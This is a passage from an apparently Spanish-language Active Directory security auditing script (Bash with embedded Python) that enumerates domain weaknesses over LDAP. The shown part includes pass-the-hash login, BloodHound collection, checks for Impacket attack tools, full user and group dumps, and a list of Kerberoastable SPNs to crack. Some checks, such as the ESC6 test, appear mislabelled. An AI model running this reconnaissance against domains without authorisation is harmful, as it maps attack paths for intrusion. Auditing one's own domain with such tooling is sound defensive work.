        _ad_finding "MEDIO" "Domain Admins Con Email — Posible Cuenta Dual-Use" \
            "<p><b>${dae_count} cuentas de Domain Admin</b> tienen dirección de email configurada, lo que sugiere que se usan para trabajo diario Y tareas administrativas.</p>
            <p><b>Riesgo:</b> Phishing, credential stuffing y browser-based attacks pueden comprometer credenciales de DA directamente.</p>" \
            "6.0" \
            "Separar cuentas: cuenta normal (correo, navegación) + cuenta admin dedicada (solo para tareas admin, sin email, sin internet). Implementar PAW (Privileged Access Workstations)." \
            "Get-ADGroupMember 'Domain Admins' | Get-ADUser -Properties mail | ?{\\$_.mail}"
    else
        _ad_ok "Domain Admins sin email (cuentas dedicadas correctamente separadas)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 30: RECYCLE BIN DE AD HABILITADO
    # ════════════════════════════════════════════════════════════
    _ad_log "[28/35] AD Recycle Bin habilitado"
    local rb_data
    rb_data=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,${AD_BASE_DN}" \
        "(objectClass=*)" cn msDS-EnabledFeatureBL 2>/dev/null)

    if echo "$rb_data" | grep -qi "Recycle Bin"; then
        _ad_ok "AD Recycle Bin habilitado (correcto — permite recuperación de objetos)"
    else
        _ad_finding "BAJO" "AD Recycle Bin No Habilitado" \
            "<p>El Recycle Bin de Active Directory no está habilitado. Sin él, los objetos eliminados (usuarios, grupos, OUs) no pueden recuperarse fácilmente.</p>" \
            "2.0" \
            "Habilitar: Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target ${AD_DOMAIN_FQDN}" \
            "Enable-ADOptionalFeature -Identity 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target ${AD_DOMAIN_FQDN}"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 31: AUDITORÍA — Audit Policy configurada
    # ════════════════════════════════════════════════════════════
    _ad_log "[29/35] Audit Policy — Configuración de auditoría"
    # Verificar si hay GPO de auditoría avanzada configurada
    local audit_gpo
    audit_gpo=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "CN=Policies,CN=System,${AD_BASE_DN}" \
        "(displayName=*Audit*)" cn displayName 2>/dev/null | grep -c "^dn:" || echo 0)

    if (( audit_gpo == 0 )); then
        _ad_finding "MEDIO" "Sin GPO de Auditoría Avanzada Detectada" \
            "<p>No se detectaron GPOs con nombre relacionado a auditoría. Sin auditoría correcta:</p>
            <ul><li>No hay logs de Logon/Logoff (Event 4624/4625)</li>
            <li>No hay detección de Kerberoasting (Event 4769)</li>
            <li>No hay alertas de DCSync (Event 4662)</li>
            <li>No hay logs de Process Creation (Event 4688)</li></ul>" \
            "5.5" \
            "Implementar GPO de Advanced Audit Policy Configuration con: Account Logon, Account Management, DS Access, Logon/Logoff, Object Access, Policy Change, Privilege Use, System." \
            "auditpol /get /category:* | Get-AuditPolicy -All"
    else
        _ad_ok "GPO de auditoría detectada"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 32: USUARIOS CON PASSWORD NOT REQUIRED
    # ════════════════════════════════════════════════════════════
    _ad_log "[30/35] Cuentas con PASSWD_NOTREQD"
    local notreq_data
    notreq_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
        "cn sAMAccountName" 2>/dev/null)
    local notreq_count
    notreq_count=$(echo "$notreq_data" | grep -c "^dn:" || echo 0)

    if (( notreq_count > 0 )); then
        _ad_crit "${notreq_count} cuentas activas con PASSWD_NOTREQD"
        local notreq_html="<p><b>${notreq_count} cuentas activas</b> con el flag <b>PASSWD_NOTREQD</b>. Estas cuentas pueden tener contraseña vacía o sin requisitos de complejidad.</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && notreq_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
        done <<< "$notreq_data"
        notreq_html+="</ul>"

        _ad_finding "CRÍTICO" "PASSWD_NOTREQD — ${notreq_count} Cuentas Sin Contraseña Obligatoria" \
            "$notreq_html" "9.0" \
            "Remover flag PASSWD_NOTREQD de todas las cuentas. Verificar si tienen contraseña vacía. Cambiar contraseñas y aplicar política." \
            "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=32)' | Set-ADUser -Replace @{userAccountControl=512}"
    else
        _ad_ok "Sin cuentas PASSWD_NOTREQD"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 33: BLOODHOUND DATA COLLECTION (si disponible)
    # ════════════════════════════════════════════════════════════
    _ad_log "[31/35] BloodHound — Recolección de datos de ataque paths"
    if python3 -c "import bloodhound" 2>/dev/null || command -v bloodhound-python >/dev/null 2>&1; then
        _ad_log "bloodhound-python disponible → recolectando..."
        local bh_cmd="bloodhound-python"
        command -v bloodhound-python >/dev/null 2>&1 || bh_cmd="python3 -m bloodhound"

        "$bh_cmd" \
            -u "${AD_USER}" \
            -p "${AD_PASS}" \
            -d "${AD_DOMAIN_FQDN}" \
            -ns "${AD_DC_IP}" \
            -c All \
            --zip \
            -o "${AD_OUT_DIR}/bloodhound/" 2>/dev/null && \
            _ad_ok "BloodHound data recolectada en ${AD_OUT_DIR}/bloodhound/"

        _ad_finding "INFO" "BloodHound — Datos Recolectados" \
            "<p>Datos de BloodHound recolectados en <code>${AD_OUT_DIR}/bloodhound/</code>. Importar en BloodHound GUI para análisis visual de attack paths.</p>
            <p>Queries útiles en BloodHound:
            <ul><li>Find Shortest Paths to Domain Admins</li>
            <li>Find Principals with DCSync Rights</li>
            <li>Find AS-REP Roastable Users</li>
            <li>Shortest Path to Unconstrained Delegation Systems</li></ul></p>" \
            "N/A" \
            "Instalar BloodHound: sudo apt install bloodhound" \
            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All --zip"
    else
        _ad_finding "INFO" "BloodHound No Disponible" \
            "<p>Instalar para análisis completo de attack paths:</p>
            <code>pip3 install bloodhound --break-system-packages</code><br>
            <code>sudo apt install bloodhound</code>" \
            "N/A" "pip3 install bloodhound --break-system-packages" \
            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 34: IMPACKET — Verificar herramientas disponibles
    # ════════════════════════════════════════════════════════════
    _ad_log "[32/35] Impacket — Verificación de herramientas ofensivas"
    local impacket_tools=(GetUserSPNs GetNPUsers secretsdump psexec smbclient wmiexec atexec dcomexec)
    local avail=() missing=()
    for tool in "${impacket_tools[@]}"; do
        if command -v "impacket-${tool}" >/dev/null 2>&1 || \
           command -v "${tool}.py" >/dev/null 2>&1; then
            avail+=("$tool")
        else
            missing+=("$tool")
        fi
    done
    _ad_log "Impacket disponible: ${#avail[@]}/${#impacket_tools[@]} herramientas"

    # ════════════════════════════════════════════════════════════
    # CHECK 35: ENUMERACIÓN COMPLETA — Volcar datos para análisis offline
    # ════════════════════════════════════════════════════════════
    _ad_log "[33/35] Dump completo de usuarios del dominio"
    _ldap "(objectClass=user)" \
        "sAMAccountName cn mail department title lastLogonTimestamp userAccountControl pwdLastSet" \
        > "${AD_OUT_DIR}/all_users.txt" 2>/dev/null
    local user_total
    user_total=$(grep -c "^dn:" "${AD_OUT_DIR}/all_users.txt" 2>/dev/null || echo 0)
    _ad_log "Usuarios exportados: ${user_total} → ${AD_OUT_DIR}/all_users.txt"

    _ad_log "[34/35] Dump de grupos y membresías"
    _ldap "(objectClass=group)" "cn description member managedBy" \
        > "${AD_OUT_DIR}/all_groups.txt" 2>/dev/null

    _ad_log "[35/35] Dump de equipos del dominio"
    _ldap "(objectClass=computer)" \
        "cn dNSHostName operatingSystem operatingSystemVersion lastLogonTimestamp" \
        > "${AD_OUT_DIR}/all_computers.txt" 2>/dev/null
    local comp_total
    comp_total=$(grep -c "^dn:" "${AD_OUT_DIR}/all_computers.txt" 2>/dev/null || echo 0)
    _ad_log "Equipos exportados: ${comp_total} → ${AD_OUT_DIR}/all_computers.txt"

    # ════════════════════════════════════════════════════════════
    # RESUMEN FINAL ADPULSE
    # ════════════════════════════════════════════════════════════
    echo
    echo -e "${C_PUR}  ╔════════════════════════════════════════════╗${C_RST}"
    echo -e "${C_PUR}  ║       ADPulse — Resumen del Análisis        ║${C_RST}"
    echo -e "${C_PUR}  ╚════════════════════════════════════════════╝${C_RST}"
    echo
    echo -e "  Dominio  : ${C_YEL}${AD_DOMAIN_FQDN}${C_RST}"
    echo -e "  DC       : ${C_YEL}${AD_DC_IP}${C_RST}"
    echo -e "  Usuarios : ${C_CYN}${user_total}${C_RST}"
    echo -e "  Equipos  : ${C_CYN}${comp_total}${C_RST}"
    echo
    echo -e "  ${C_RED}Críticos  : ${AD_CRITICAL}${C_RST}"
    echo -e "  ${C_YEL}Altos     : ${AD_HIGH}${C_RST}"
    echo -e "  ${C_CYN}Medios    : ${AD_MEDIUM}${C_RST}"
    echo -e "  ${C_DIM}Bajos/Info: $((AD_LOW + AD_INFO))${C_RST}"
    echo

    # Kerberoastable
    if (( ${#AD_KERBEROASTABLE[@]} > 0 )); then
        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} Kerberoastable: ${AD_KERBEROASTABLE[*]}"
    fi
    if (( ${#AD_ASREPROASTABLE[@]} > 0 )); then
        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} AS-REP Roastable: ${AD_ASREPROASTABLE[*]}"
    fi
    if (( ${#AD_ADCS_TEMPLATES[@]} > 0 )); then
        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} ADCS vulnerables: ${AD_ADCS_TEMPLATES[*]}"
    fi

    echo
    echo -e "  Archivos generados:"
    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_users.txt${C_RST}      — todos los usuarios"
    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_groups.txt${C_RST}     — todos los grupos"
    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_computers.txt${C_RST}  — todos los equipos"
    echo -e "  ${C_CYN}${AD_OUT_DIR}/kerberoastable.txt${C_RST} — SPNs para crackear"
    [[ -f "${AD_OUT_DIR}/gpos.txt" ]] && \
        echo -e "  ${C_CYN}${AD_OUT_DIR}/gpos.txt${C_RST}             — GPOs del dominio"
    echo

    # Guardar intel para el reporte
    intel_log "ADPulse: Críticos=${AD_CRITICAL} Altos=${AD_HIGH} Medios=${AD_MEDIUM} | Kerberoastable=${#AD_KERBEROASTABLE[@]} | ADCS ESC=${#AD_ADCS_TEMPLATES[@]}"
}



# ════════════════════════════════════════════════════════════════
# VARIABLES INTEL — ACTIVE DIRECTORY
# ════════════════════════════════════════════════════════════════
INTEL_AD_DOMAIN=""              # dominio detectado: corp.local
INTEL_AD_DC=""                  # IP del Domain Controller
INTEL_AD_USERS=()               # usuarios encontrados
INTEL_AD_ADMINS=()              # usuarios en grupos privilegiados
INTEL_AD_KERBEROASTABLE=()      # SPNs kerberoasteables
INTEL_AD_ASREP_USERS=()         # usuarios sin pre-auth Kerberos
INTEL_AD_PASSWORD_POLICY=""     # política de contraseñas
INTEL_AD_ADCS_FOUND=false       # ADCS detectado
INTEL_AD_ADCS_TEMPLATES=()      # templates ADCS vulnerables
INTEL_AD_LAPS_DEPLOYED=false    # LAPS está instalado
INTEL_AD_UNCONSTRAINED=()       # máquinas con delegación sin restricciones
INTEL_AD_CONSTRAINED=()         # cuentas con delegación restringida
INTEL_AD_RBCD=()                # Resource-Based Constrained Delegation
INTEL_AD_NULL_SESSIONS=false    # sesiones null en LDAP
INTEL_AD_CREDS=""               # "user:pass" si el usuario proveyó credenciales

# ════════════════════════════════════════════════════════════════
# MÓDULO 45: ADPULSE — Active Directory Security Auditor
# 35 tipos de misconfiguraciones | LDAP read-only
# ════════════════════════════════════════════════════════════════
modulo_adpulse() {
    # ── Activación: requiere puerto 88 (Kerberos) o 389 (LDAP) ──
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(88|389|636|3268|3269)(,|$)" || {
        [[ "$INTEL_OS" == "windows" ]] || return
    }

    log "MÓDULO 45: ADPulse — Active Directory Security Auditor"
    tip "35 tipos de misconfiguraciones AD: Kerberoasting, ADCS, Delegation, ACLs, Password Policy y más."
    echo -e "  ${C_YEL}NOTA:${C_RST} Requiere autenticación para auditoría completa."
    echo -e "  ${C_DIM}Auditoría de solo lectura. No modifica nada en el AD.${C_RST}"
    echo

    # ── Detectar DC ──────────────────────────────────────────────
    INTEL_AD_DC="${TARGET}"

    # ── Intentar detectar dominio desde LDAP anónimo ─────────────
    local ldap_base=""
    ldap_base=$(python3 -c "
import socket, struct, sys
try:
    # Enviar LDAP anonymous rootDSE query
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('${TARGET}', 389))
    # Simple LDAP search request for defaultNamingContext
    pkt = bytes.fromhex('300c020101600702010304000480')
    s.send(pkt)
    resp = s.recv(4096)
    s.close()
    # Buscar patrón DC= en la respuesta
    import re
    match = re.search(b'DC=[^,\x00]+(?:,DC=[^,\x00]+)+', resp)
    if match:
        print(match.group(0).decode('utf-8','ignore'))
except:
    pass
" 2>/dev/null)

    # Alternativa: detectar dominio via nmap o CME results
    if [[ -z "$ldap_base" ]]; then
        ldap_base=$(grep -oiE "DC=[A-Z0-9]+,DC=[A-Z0-9]+" "${OUTPUT_DIR}/recon/cme_results.txt" 2>/dev/null | head -1)
    fi
    if [[ -z "$ldap_base" ]]; then
        ldap_base=$(grep -oiE "Domain: [a-z0-9\.-]+" "${OUTPUT_DIR}/nmap/scan_version.nmap" 2>/dev/null | \
            head -1 | awk '{print $2}' | \
            python3 -c "import sys; d=sys.stdin.read().strip(); parts=d.split('.'); print(','.join(['DC='+p for p in parts if p]))" 2>/dev/null)
    fi

    [[ -z "$ldap_base" ]] && {
        warn "No se pudo detectar base LDAP automáticamente."
        echo -ne "  ${C_YEL}Introduce la base LDAP (ej: DC=corp,DC=local) o Enter para saltar: ${C_RST}"
        read -r ldap_base
        [[ -z "$ldap_base" ]] && { warn "ADPulse: Base LDAP no disponible. Saltando."; return; }
    }

    # Extraer nombre de dominio legible
    INTEL_AD_DOMAIN=$(echo "$ldap_base" | python3 -c "
import sys,re
b = sys.stdin.read().strip()
parts = re.findall(r'DC=([^,]+)', b, re.I)
print('.'.join(parts))
" 2>/dev/null)

    ok "DC: ${C_YEL}${INTEL_AD_DC}${C_RST} | Dominio: ${C_YEL}${INTEL_AD_DOMAIN}${C_RST} | Base: ${C_YEL}${ldap_base}${C_RST}"
    echo

    # ── Pedir credenciales (opcional) ────────────────────────────
    local ad_user="" ad_pass="" ad_hash=""
    echo -e "  ${C_BLU}Autenticación AD (opcional, Enter para anónimo):${C_RST}"
    echo -ne "  ${C_DIM}Usuario (ej: jsmith o CORP\\\\jsmith): ${C_RST}"
    read -r ad_user
    if [[ -n "$ad_user" ]]; then
        echo -ne "  ${C_DIM}Contraseña (o Enter para hash NTLM): ${C_RST}"
        read -rs ad_pass; echo
        if [[ -z "$ad_pass" ]]; then
            echo -ne "  ${C_DIM}Hash NTLM (aad3b...): ${C_RST}"
            read -r ad_hash
        fi
        INTEL_AD_CREDS="${ad_user}:${ad_pass:-${ad_hash}}"
    fi
    echo

    # ── Verificar dependencias Python AD ─────────────────────────
    local ldap3_ok=false impacket_ok=false
    python3 -c "import ldap3" 2>/dev/null      && ldap3_ok=true
    python3 -c "import impacket" 2>/dev/null   && impacket_ok=true

    if [[ "$ldap3_ok" == "false" ]]; then
        warn "ldap3 no instalado. Instalando..."
        pip3 install ldap3 --break-system-packages -q 2>/dev/null && ldap3_ok=true || \
            warn "No se pudo instalar ldap3. Instalar: pip3 install ldap3"
    fi
    if [[ "$impacket_ok" == "false" ]]; then
        warn "impacket no instalado. Instalar para Kerberoasting: pip3 install impacket"
    fi

    # ── Crear el script Python principal ADPulse ─────────────────
    local adpulse_py="${OUTPUT_DIR}/recon/adpulse_audit.py"
    local adpulse_json="${OUTPUT_DIR}/recon/adpulse_results.json"

    cat > "$adpulse_py" << 'PYAD'
#!/usr/bin/env python3
"""ADPulse — Active Directory Security Auditor
Detecta 35 tipos de misconfiguraciones via LDAP read-only.
"""
import json, sys, re, os, argparse
from datetime import datetime, timezone
from collections import defaultdict

# ── Colores para consola ──────────────────────────────────────
R='\033[91m'; Y='\033[93m'; G='\033[92m'; B='\033[94m'
C='\033[96m'; D='\033[2m'; W='\033[0m'; M='\033[95m'
BOLD='\033[1m'

findings = []
stats = defaultdict(int)

def finding(severity, category, title, detail, remediation, cvss=0.0, refs=None):
    sev_colors = {"CRÍTICO": R+BOLD, "ALTO": R, "MEDIO": Y, "BAJO": G, "INFO": B}
    color = sev_colors.get(severity, W)
    icon  = {"CRÍTICO":"💀","ALTO":"🔴","MEDIO":"🟡","BAJO":"🟢","INFO":"ℹ️"}.get(severity,"•")
    print(f"\n  {color}{icon} [{severity}]{W} {BOLD}{title}{W}")
    print(f"  {D}{category}{W}")
    if isinstance(detail, list):
        for d in detail[:5]: print(f"    {C}→{W} {d}")
        if len(detail) > 5: print(f"    {D}... y {len(detail)-5} más{W}")
    else:
        print(f"  {D}{detail[:200]}{W}")
    print(f"  {Y}Remediar:{W} {remediation[:150]}")
    stats[severity] += 1
    findings.append({
        "severity": severity, "category": category, "title": title,
        "detail": detail if isinstance(detail, list) else [detail],
        "remediation": remediation, "cvss": cvss,
        "refs": refs or [], "timestamp": datetime.now(timezone.utc).isoformat()
    })

def section(name):
    print(f"\n  {B}{'─'*56}{W}")
    print(f"  {B}[*]{W} {BOLD}{name}{W}")

# ── CONEXIÓN LDAP ─────────────────────────────────────────────
def connect_ldap(dc, base_dn, user=None, password=None, ntlm_hash=None):
    try:
        import ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, ANONYMOUS
        server = Server(dc, port=389, get_info=ALL, connect_timeout=10)

        if user and (password or ntlm_hash):
            # Intentar autenticación
            if '\\' not in user and '@' not in user:
                domain_part = base_dn.replace(',', '.').replace('DC=', '').replace('dc=', '')
                domain_short = domain_part.split('.')[0].upper()
                user_fqdn = f"{domain_short}\\{user}"
            else:
                user_fqdn = user

            if ntlm_hash:
                # Pass-the-Hash
                lm_hash = "aad3b435b51404eeaad3b435b51404ee"
                full_hash = f"{lm_hash}:{ntlm_hash}"
                conn = Connection(server, user=user_fqdn, password=full_hash,
                                  authentication=NTLM, auto_bind=True)
            else:
                conn = Connection(server, user=user_fqdn, password=password,
                                  authentication=NTLM, auto_bind=True)
        else:
            # Anónimo
            conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)

        return conn, ldap3
    except Exception as e:
        return None, None

# ─────────────────────────────────────────────────────────────
# LOS 35 CHECKS
# ─────────────────────────────────────────────────────────────

def check_01_null_session(conn, base_dn, ldap3):
    """CHECK 1: LDAP Null/Anonymous Session"""
    section("CHECK 01 — LDAP Anonymous Bind")
    try:
        conn.search(base_dn, '(objectClass=domain)',
                    attributes=['distinguishedName','name','lockoutDuration','pwdProperties'])
        if conn.entries:
            finding("ALTO", "LDAP Exposure",
                "LDAP Anonymous Bind Habilitado",
                f"El servidor {args.dc} acepta conexiones LDAP anónimas. Permite enumerar usuarios, grupos y políticas.",
                "Deshabilitar anonymous LDAP bind. GPO: Network access: Allow anonymous SID/name translation = Disabled",
                7.5, ["https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-allow-anonymous-sidname-translation"])
            return conn.entries
        else:
            print(f"  {G}[OK]{W} LDAP anonymous bind denegado.")
    except Exception as e:
        print(f"  {Y}[?]{W} No se pudo verificar anonymous bind: {e}")
    return []

def check_02_password_policy(conn, base_dn, ldap3):
    """CHECK 2: Password Policy débil"""
    section("CHECK 02 — Password Policy")
    try:
        conn.search(base_dn, '(objectClass=domain)',
                    attributes=['minPwdLength','pwdHistoryLength','maxPwdAge',
                                'lockoutThreshold','lockoutDuration','pwdProperties'])
        if not conn.entries: return
        domain = conn.entries[0]
        issues = []

        min_len = int(str(domain.minPwdLength or 0))
        hist    = int(str(domain.pwdHistoryLength or 0))
        thresh  = int(str(domain.lockoutThreshold or 0))

        if min_len < 12:
            issues.append(f"Longitud mínima de contraseña: {min_len} caracteres (recomendado: 14+)")
        if hist < 10:
            issues.append(f"Historial de contraseñas: {hist} (recomendado: 24)")
        if thresh == 0:
            issues.append("Sin bloqueo de cuenta (lockoutThreshold = 0) → permite fuerza bruta ilimitada")
        elif thresh > 10:
            issues.append(f"Umbral de bloqueo alto: {thresh} intentos (recomendado: 3-5)")

        # pwdProperties: bit 0 = complexity, bit 4 = no cleartext
        pwd_props = int(str(domain.pwdProperties or 0))
        if not (pwd_props & 1):
            issues.append("Complejidad de contraseña DESHABILITADA")

        INTEL_AD_PASSWORD_POLICY = f"minLen:{min_len} hist:{hist} lockout:{thresh} complexity:{bool(pwd_props&1)}"

        if issues:
            finding("MEDIO", "Password Policy",
                "Política de Contraseñas Débil",
                issues,
                "Fortalecer via Default Domain Policy GPO: Mínimo 14 chars, complejidad ON, historial 24, lockout 5 intentos.",
                5.5, ["https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management"])
        else:
            print(f"  {G}[OK]{W} Política de contraseñas robusta.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_03_kerberoastable(conn, base_dn, ldap3):
    """CHECK 3: Cuentas Kerberoasteables (SPNs en cuentas de usuario)"""
    section("CHECK 03 — Kerberoasting (SPNs en cuentas de usuario)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName','servicePrincipalName','pwdLastSet','description'])
        if conn.entries:
            accounts = []
            for e in conn.entries:
                spns = [str(s) for s in (e.servicePrincipalName.values if hasattr(e.servicePrincipalName,'values') else [e.servicePrincipalName])]
                pwd_age = "desconocido"
                if e.pwdLastSet and str(e.pwdLastSet) not in ['0','']:
                    try:
                        from ldap3.utils.conv import format_time
                        accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")
                    except:
                        accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")
                else:
                    accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")

            finding("CRÍTICO", "Kerberoasting",
                f"Kerberoasting Posible: {len(conn.entries)} Cuenta(s) con SPN",
                accounts,
                "Usar MSAs/gMSAs para servicios. Contraseñas largas (+25 chars) para cuentas de servicio. Monitorear TGS requests.",
                8.8, ["https://attack.mitre.org/techniques/T1558/003/",
                      "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"])
            return [str(e.sAMAccountName) for e in conn.entries]
        else:
            print(f"  {G}[OK]{W} Sin cuentas kerberoasteables.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")
    return []

def check_04_asrep_roasting(conn, base_dn, ldap3):
    """CHECK 4: AS-REP Roasting (no pre-auth requerida)"""
    section("CHECK 04 — AS-REP Roasting (DONT_REQ_PREAUTH)")
    try:
        # UAC bit 4194304 = DONT_REQ_PREAUTH
        conn.search(base_dn,
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(objectClass=computer)))',
            attributes=['sAMAccountName','description','pwdLastSet'])
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            finding("CRÍTICO", "AS-REP Roasting",
                f"AS-REP Roasting: {len(users)} Cuenta(s) sin Pre-Autenticación Kerberos",
                users,
                "Habilitar pre-autenticación Kerberos en todas las cuentas. Solo deshabilitar si es estrictamente necesario.",
                8.8, ["https://attack.mitre.org/techniques/T1558/004/"])
            return users
        else:
            print(f"  {G}[OK]{W} Todas las cuentas requieren pre-autenticación Kerberos.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")
    return []

def check_05_adcs_vulnerabilities(conn, base_dn, ldap3):
    """CHECK 5: ADCS — Certificados ESC1-ESC8"""
    section("CHECK 05 — ADCS Certificate Templates (ESC1-ESC8)")
    try:
        pki_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base_dn}"
        conn.search(pki_base,
            '(objectClass=pKICertificateTemplate)',
            attributes=['cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag',
                        'msPKI-RA-Signature','pKIExtendedKeyUsage','nTSecurityDescriptor',
                        'msPKI-Certificate-Application-Policy'])
        if not conn.entries:
            print(f"  {D}[i]{W} ADCS no detectado en este dominio (o sin permisos).")
            return

        print(f"  {C}[+]{W} ADCS detectado — analizando {len(conn.entries)} templates...")
        vuln_templates = []

        for template in conn.entries:
            name = str(template.cn)
            flags_name    = int(str(template['msPKI-Certificate-Name-Flag'] or 0))
            flags_enroll  = int(str(template['msPKI-Enrollment-Flag'] or 0))
            ra_sigs       = int(str(template['msPKI-RA-Signature'] or 1))
            ekus          = [str(e) for e in (template.pKIExtendedKeyUsage.values if hasattr(template.pKIExtendedKeyUsage,'values') else [])]

            issues = []

            # ESC1: Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT)
            if flags_name & 1:  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                if any(eku in ekus for eku in ['1.3.6.1.5.5.7.3.2', '1.3.6.1.5.5.7.48.1.1', '']):
                    issues.append(f"ESC1: Enrollee puede especificar SAN arbitrario (flags_name={flags_name})")

            # ESC2: Template con Any Purpose EKU o sin EKU
            if '2.5.29.37.0' in ekus or not ekus:
                issues.append(f"ESC2: Template con EKU 'Any Purpose' o sin EKU (peligroso)")

            # ESC3: Template para Certificate Request Agent sin restricciones
            if '1.3.6.1.4.1.311.20.2.1' in ekus and ra_sigs == 0:
                issues.append(f"ESC3: Certificate Request Agent sin firmas requeridas")

            # ESC4: Permisos de escritura en el template
            # (simplificado — verificar msPKI-Certificate-Name-Flag write perms)

            # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado en CA
            if flags_enroll & 64:  # CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL
                issues.append(f"ESC6: Template permite SAN por email (potencialmente explotable)")

            if issues:
                vuln_templates.append(f"Template '{name}': {'; '.join(issues)}")

        if vuln_templates:
            finding("CRÍTICO", "ADCS / PKI",
                f"ADCS Templates Vulnerables: {len(vuln_templates)} template(s) con misconfiguraciones",
                vuln_templates,
                "Revisar templates con Certify.exe /vulnerable. Deshabilitar EDITF_ATTRIBUTESUBJECTALTNAME2. Limitar permisos de enrollment.",
                9.0, ["https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                      "https://attack.mitre.org/techniques/T1649/"])
        else:
            print(f"  {G}[OK]{W} Sin templates ADCS vulnerables detectados.")
    except Exception as e:
        if "No such object" in str(e):
            print(f"  {D}[i]{W} ADCS no encontrado en este dominio.")
        else:
            print(f"  {Y}[?]{W} Error ADCS: {e}")

def check_06_unconstrained_delegation(conn, base_dn, ldap3):
    """CHECK 6: Delegación Sin Restricciones (Unconstrained Delegation)"""
    section("CHECK 06 — Unconstrained Delegation")
    try:
        # UAC bit 524288 = TRUSTED_FOR_DELEGATION
        conn.search(base_dn,
            '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))',
            attributes=['sAMAccountName','dNSHostName','operatingSystem'])
        computers = [f"{e.sAMAccountName} ({e.dNSHostName})" for e in conn.entries]

        # También buscar usuarios con unconstrained delegation
        conn.search(base_dn,
            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))',
            attributes=['sAMAccountName','description'])
        users_ud = [str(e.sAMAccountName) for e in conn.entries]

        all_targets = computers + users_ud
        if all_targets:
            finding("CRÍTICO", "Kerberos Delegation",
                f"Unconstrained Delegation en {len(all_targets)} objeto(s)",
                all_targets,
                "Migrar a Constrained o Resource-Based Constrained Delegation. Habilitar 'Account is sensitive and cannot be delegated' en cuentas privilegiadas.",
                8.5, ["https://attack.mitre.org/techniques/T1134/001/",
                      "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"])
        else:
            print(f"  {G}[OK]{W} Sin objetos con Unconstrained Delegation (excepto DCs).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_07_constrained_delegation(conn, base_dn, ldap3):
    """CHECK 7: Constrained Delegation mal configurada"""
    section("CHECK 07 — Constrained Delegation (msDS-AllowedToDelegateTo)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(msDS-AllowedToDelegateTo=*))',
            attributes=['sAMAccountName','msDS-AllowedToDelegateTo'])
        if conn.entries:
            targets = []
            for e in conn.entries:
                services = e['msDS-AllowedToDelegateTo'].values if hasattr(e['msDS-AllowedToDelegateTo'],'values') else [e['msDS-AllowedToDelegateTo']]
                targets.append(f"{e.sAMAccountName} → {', '.join(str(s) for s in list(services)[:3])}")
            finding("ALTO", "Kerberos Delegation",
                f"Constrained Delegation: {len(conn.entries)} cuenta(s)",
                targets,
                "Auditar si los servicios destino son realmente necesarios. Preferir RBCD cuando sea posible. Monitorear S4U2Proxy.",
                7.0, ["https://attack.mitre.org/techniques/T1134/001/"])
        else:
            print(f"  {G}[OK]{W} Sin Constrained Delegation no estándar.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_08_rbcd(conn, base_dn, ldap3):
